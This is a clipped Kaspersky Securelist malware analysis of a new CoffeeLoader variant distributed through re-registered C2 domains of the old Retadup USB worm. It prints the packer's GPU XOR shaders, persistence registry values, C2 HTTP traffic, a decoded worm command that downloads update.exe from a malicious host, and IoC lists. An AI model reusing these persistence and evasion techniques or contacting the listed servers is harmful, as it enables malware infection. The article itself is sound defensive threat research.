---
title: "A USB worm’s second life: Retadup spreading CoffeeLoader"
source: https://securelist.com/retadup-delivers-coffeeloader/121908/
source_host: securelist.com
clip_date: 2026-11-19T09:11:29+08:00
trace_id: a30c080b-8ee6-4460-8b48-e9645935a711
content_hash: ac5d4dda00a82c5cda6f1cc789a19e6c577b90f2523b26b2f26712f8dc4f274a
status: synced
tags: []
series: null
feed_source: Kaspersky Securelist
ai_summary: null
ai_summary_style: null
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 41d75244-d011-814e-b5c7-caed39d73f53
ioc:
  cves: []
  cwes: []
  hashes:
    - "00000000000000000000000000000000"
    - 2026f751079659cf71c7ba64b345c12a
    - 2272dde17925d6179bea6fcf4d543d20
    - 449c9e8bc6eb308aa3c46c88959e1a4f
    - 58886d45a0c5e802a5d0a7545c36112d
    - 62327438664878386332786c5a5841744e6a41774d4441774c584e735a575677
    - a21251838432306f2cd2540593656b9e
    - cca710c5455c1fe2732771afbac16a09
    - d7785198d9341310978e4cedc7bdb735
    - dce55eec553f6af16ba6481eaacb8638
    - fd0c7ee872277f33e3335530299b836a
  domains: []
  tools: []
  techniques: []
---

![](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/fd02d09ff3f49f6f.jpg)

In August 2026, we detected a new variant of the CoffeeLoader malware in the wild. On launch, the NSIS-based installer executable dropped a file named 7z.dll into a temporary directory and ran it through rundll32.exe. The 7z.dll file was a patched version of the original library of the popular 7-Zip archiver. Part of its code had been replaced with malicious self-decrypting shellcode that turned out to be a new version of the Armoury packer. This packer was also [previously used](https://www.zscaler.com/blogs/security-research/coffeeloader-brew-stealthy-techniques) in the CoffeeLoader Trojan.

## New Armoury variant

The old variant of the Armoury packer used the GPU to decrypt the Trojan’s main body, relying on the OpenCL library, which implements the [standard of the same name](https://en.wikipedia.org/wiki/OpenCL) for high-performance computing.

```java
__kernel void f(__global char* a,__global char* b,__global char* c,int d)
{
   c[get_global_id(0)] = a[get_global_id(0)] ^ b[get_global_id(0) % d];
}
```

The new variant also utilizes the GPU, but instead of OpenCL, it uses the OpenGL library, which implements the [eponymous standard](https://en.wikipedia.org/wiki/OpenGL) for applications that work with 2D and 3D graphics.

```haskell
layout(local_size_x = 256) in;

layout(std430, binding = 0) buffer DataBuffer {
    uint data[];
};

layout(std430, binding = 1) buffer KeyBuffer {
    uint key[];
};

layout(std430, binding = 2) buffer ResultBuffer {
    uint result[];
};

void main() {
    uint index = gl_GlobalInvocationID.x;
    
    if (index >= data.length()) {
        return;
    }
    
    uint dataValue = data[index];
    uint keyValue = key[index];
    result[index] = dataValue ^ keyValue;
}
```

The Armoury payload has also changed. Previously, it was a DLL containing two shellcode fragments and the main body of CoffeeLoader. The first shellcode is a dropper responsible for installing the Trojan and gaining persistence. To do this, it copies the library to Windows folders and adds it to autorun. The second is a stager that creates a new dllhost.exe process and injects the main body of CoffeeLoader into it; in this variant, the main body is an executable file. Unlike the old version, the new version of the packer delivers yet another shellcode.

## CoffeeLoader downloader

The shellcode decrypted by the Armoury packer is a new intermediate link in the infection chain: the CoffeeLoader downloader. It fully incorporates the dropper and stager functionality described above, as well as downloader functions used to fetch the Trojan’s main body.

[![New CoffeeLoader downloader viewed in a text editor](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/7499cee9c784d0c5.png "New CoffeeLoader downloader viewed in a text editor1")](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2026/11/10162345/New-CoffeeLoader-downloader-viewed-in-a-text-editor1.png)

New CoffeeLoader downloader viewed in a text editor

To establish persistence, the Trojan copies 7z.dll to subfolders of %PROGRAMDATA% or %LOCALAPPDATA%. The Run registry key is used for autorun. The subfolder, library, and registry value are named with eight hexadecimal digits generated from system volume information.

```
C:\ProgramData\b79faace\b79faace.dll
C:\Users\[username]\AppData\Local\b79faace\b79faace.dll
```

```
Software\Microsoft\Windows\CurrentVersion\Run
'b79faace.dll' = 'rundll32.exe "C:\ProgramData\b79faace\b79faace.dll",SetCodecs'
```

To protect itself, the downloader creates a registry key that prevents the user from disabling autorun through Task Manager.

```
Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run
'b79faace.dll' = [080000000000000000000000]
```

Once persistence is established, the malware launches one of several processes (dllhost.exe, WerFault.exe, svchost.exe, OpenWith.exe, or AtBroker.exe), injects itself into it, and downloads the Trojan’s main body from a hardcoded C2 server address. The download is performed over HTTPS using the `/payload?md5=` path. On the first request to the server, the `md5` parameter is set to zeros. On subsequent requests, it contains the hash of the previously downloaded payload.

Example of a request to download the main body of CoffeeLoader:

```
GET /payload?md5=00000000000000000000000000000000 HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:152.0) Gecko/20100101 Firefox/152.0
Host: api.internet-speed-check.com
```

Example of a server response:

```
HTTP/1.1 200 OK
Date: Tue, 29 Sep 2026 14:34:25 GMT
Content-Type: application/octet-stream
Content-Length: 60800
Connection: close
Server: cloudflare
x-content-md5: d7785198d9341310978e4cedc7bdb735
x-signature: MEUCIDQNr86sBN3hmnLarIuPJ2WJEtXeIdnfsR4AkHUBI0AtAiEAyV5o2VM+LPDbme8nYdRydkrtI02TzyNdKh7+AdvPzUs=
strict-transport-security: max-age=63072000; includeSubdomains
x-frame-options: DENY
x-content-type-options: nosniff
cf-cache-status: DYNAMIC
Nel: {"report_to":"cf-nel","success_fraction":0.0,"max_age":604800}
Server-Timing: cfCacheStatus;desc="DYNAMIC"
Server-Timing: cfEdge;dur=4,cfOrigin;dur=66
Report-To: {"group":"cf-nel","max_age":604800,"endpoints":[{"url":"https://a.nel.cloudflare.com/report/v4?s=AAAAAAAA"}]}
CF-RAY: cf27d75a42bb5669-MIA
alt-svc: h3=":443"; ma=86400
```

In response to the request, the C2 returns encrypted shellcode that contains the main body of the Trojan. The payload is encrypted with a simple XOR, and the first 16 bytes of the downloaded data serve as the key.

The HTTP response header also contains two fields: `X-Signature` and `X-Content-MD5`. The first contains a signature for the downloaded data, which is verified with a public key embedded in the Trojan.

```
RUNTMSAAAAC2gVlbqvpsSutLE0/4ogdQ20Uw4qQyQQCw7448NvjMOaYWr+mlrvWiDCg79jWIhjiIuGuqxTb9VMsuceH4WyA5
```

The second field contains the MD5 checksum of the decrypted payload body.

If both the signature and the checksum checks pass, the Trojan allocates executable memory in its own process and transfers control to the downloaded and decrypted shellcode.

## Main CoffeeLoader module

Once it gains control, the shellcode decrypts and sets up the main body of CoffeeLoader, then passes control to it. The Trojan itself hasn’t changed much since previous campaigns. In the new version, the attackers use different keys to encrypt requests to the C2 and decrypt its responses: A21251838432306F2CD2540593656B9E and 2026F751079659CF71C7BA64B345C12A.

Certificate validation during the connection to the C2 has been replaced with signature verification of the C2 responses, which relies on the public key 23:6A:0D:E7:E0:FA:20:BC:0F:F4:7C:F6:8F:49:89:A8:10:BE:91:F0:0F:C2:F3:99:4D:46:F7:DF:D2:33:0B:00:6D:54:7A:AA:92:45:89:16:84:48:2E:AF:B8:F7:75:8A:4C:39:07:C5:24:EA:9D:3A:C6:FD:13:61:7D:54:19:FA. The binary communication protocol no longer uses the magic constant `0xC0FFEE42`, which gave the malware its name: it now uses the far less telling value `0xD1D57871`.

However, we found no changes in functionality. The code contains the same three previously described commands for running a payload received from the C2: injecting it into a process, saving it to disk as an executable and then running it, or saving it as a DLL and running it via rundll32.exe.

## Distribution and initial infection

The most notable finding was how exactly this CoffeeLoader variant spreads. Malware is most often distributed through email attachments, websites posing as free software download portals, ad banners that send users who click them through a chain of redirects to phishing resources, pirated software, and so on. CoffeeLoader infections, however, come from the Retadup worm.

Retadup is a malicious computer worm first discovered in 2017. It was written in the AutoIt and AutoHotkey scripting languages. Once on a victim’s device, it copied itself to all connected USB flash drives and external drives as hidden files and shortcuts (LNK files). When a user opened the infected flash drive on another PC and clicked the shortcut, the worm made its way onto the new device. Systems infected with Retadup were joined into a botnet that could download and run additional malware on the operator’s command.

In July 2019, French law enforcement gained access to Retadup’s C2 servers and took control of the botnet. As soon as an infected computer checked in with the server for new commands, it was instructed to wipe the worm body from the system. Within just a few weeks, more than 850,000 machines were disinfected, and the botnet ceased to exist… until 2024.

Two years ago, someone began re-registering the domain names that Retadup had used as C2 servers and using them to issue commands to download third-party malware. At first, this was the SmokeLoader downloader packed using the 32-bit version of Armoury, but in early 2025, the same servers started serving CoffeeLoader.

We don’t know whether it was the worm’s author or someone else that decided to revive the C2 servers, since Retadup’s C2 protocol is fairly simple: it consists of plaintext commands encoded with Base64 and then converted to hex.

Below is an example of traffic from a 2017 Retadup variant that still communicates successfully with its C2 in 2026.

```yaml
GET /FD0C7EE872277F33E3335530299B836A/1/4/1/0/empty HTTP/1.1
Connection: Keep-Alive
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) WinHttp/1.6.4.0 (WinHTTP/5.1) like Gecko
Host: noobminer.newblackage.com

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 06 Aug 2026 04:07:32 GMT
Content-Type: text/html
Content-Length: 68
Connection: keep-alive

::62327438664878386332786c5a5841744e6a41774d4441774c584e735a575677::
        
        decoded command: "ok||||sleep-600000-sleep"

HTTP/1.1 200 OK
Server: nginx
Date: Mon, 10 Aug 2026 04:18:43 GMT
Content-Type: text/html
Content-Length: 180
Connection: keep-alive

::623274386648783849475276643235736232466b4c576830644841364c79397964584a715a6e5a754c6e4a7a4c3356775a4746305a53356c654755364954703163475268644755755a58686c4c575276643235736232466b::
        
        decoded command: "ok|||| download-http://rurjfvn.rs/update.exe:!:update.exe-download"
```

## Geography

When the Retadup botnet was taken down in 2019, the reported figure was 850,000 disinfected systems. Our statistics for the first three quarters of this year show that the new campaign is much smaller in scale. Our solutions blocked Retadup worm infection attempts on around 15,000 systems, most of them in Peru, Angola, Russia, and Bolivia.

## IoC

**Most active Retadup C2 servers**  
[alphanoob\[.\]com](https://opentip.kaspersky.com/alphanoob.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_2fcb9c038dee9005)  
[newblackage\[.\]com  
](https://opentip.kaspersky.com/newblackage.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_a11934a695a37b02)[newminersage\[.\]com](https://opentip.kaspersky.com/newminersage.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_1665f2bf766c28a3)  
[radnewage\[.\]com](https://opentip.kaspersky.com/radnewage.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_48dfce1095998bfb)  
[minernewage\[.\]com](https://opentip.kaspersky.com/minernewage.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_224d5489b5149d9e)  
[rad2016.publicvm\[.\]com  
](https://opentip.kaspersky.com/rad2016.publicvm.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_2e2179d378cb91eb)[radpal.publicvm\[.\]com  
](https://opentip.kaspersky.com/radpal.publicvm.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_f8cb6b38523c7d5e)[roro2016.linkpc\[.\]net](https://opentip.kaspersky.com/roro2016.linkpc.net/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_a64163aa1fd0f761)  
**CoffeeLoader C2**  
[internet-speed-check\[.\]com](https://opentip.kaspersky.com/internet-speed-check.com/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_fd26846371e29f8d)  
**Servers hosting CoffeeLoader files  
**[rurjfvn\[.\]rs/update.exe](https://opentip.kaspersky.com/rurjfvn.rs%2Fupdate.exe/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_540e4d32e89908ba)  
[alphanoob\[.\]com/update.exe](https://opentip.kaspersky.com/alphanoob.com%2Fupdate.exe/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_1d9e79adee6f4805)  
**CoffeeLoader MD5 (DLL files)  
**[2272dde17925d6179bea6fcf4d543d20](https://opentip.kaspersky.com/2272dde17925d6179bea6fcf4d543d20/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_d1a3a4298f18896f)  
[dce55eec553f6af16ba6481eaacb8638](https://opentip.kaspersky.com/dce55eec553f6af16ba6481eaacb8638/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_65c0820c457152ec)  
[449c9e8bc6eb308aa3c46c88959e1a4f](https://opentip.kaspersky.com/449c9e8bc6eb308aa3c46c88959e1a4f/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_d1af0de40f8e420f)  
**CoffeeLoader MD5 (NSIS-based installers)  
**[58886d45a0c5e802a5d0a7545c36112d](https://opentip.kaspersky.com/58886d45a0c5e802a5d0a7545c36112d/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_453bb6b98b970a96)  
[cca710c5455c1fe2732771afbac16a09](https://opentip.kaspersky.com/cca710c5455c1fe2732771afbac16a09/?utm_source=SL&utm_medium=SL&utm_campaign=SL&icid=gl_sl_opentip-lnk_sm-team_3e68df7e0154eb32)
